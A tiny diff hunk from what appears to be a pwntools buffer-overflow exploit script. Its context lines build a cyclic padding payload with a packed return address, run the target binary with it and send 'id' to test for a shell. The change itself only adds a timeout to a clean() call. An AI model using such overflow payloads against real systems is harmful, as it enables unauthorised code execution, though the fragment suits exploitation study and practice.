@@ -47,7 +47,7 @@ spam += cyclic(128 + 4 - len(spam))
 spam += p32(p_exit)
 
 r = shell.run('%s $%r' % (binary, spam))
-r.clean()
+r.clean(2)
 
 
 r.sendline('id')
